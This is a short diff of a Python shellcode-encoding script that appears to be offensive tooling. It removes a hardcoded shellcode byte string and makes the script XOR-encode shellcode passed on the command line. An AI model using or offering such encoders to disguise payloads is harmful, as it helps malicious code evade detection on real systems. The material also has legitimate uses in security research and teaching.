@@ -33,8 +33,11 @@ def decode(encoded_shellcode):
         decoded_shellcode.append(hex(int(x, 16) ^ int(next(it), 16)))
     return ",".join(decoded_shellcode)
 
-def main():
-    orginal_shellcode = r"\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde"
+def main(shellcode):
+    """main()
+    shellcode: string
+    """
+    orginal_shellcode = r"{}".format(shellcode)
     new_shellcode = encode(orginal_shellcode)
     print("[+] Your encoded shellcode: ")
     print(new_shellcode)
@@ -45,5 +48,9 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) < 2:
+        print("Usage: python3 wrapper.py <shellcode>")
+        sys.exit(0)
 
+    if len(sys.argv) == 2:
+        main(sys.argv[1])
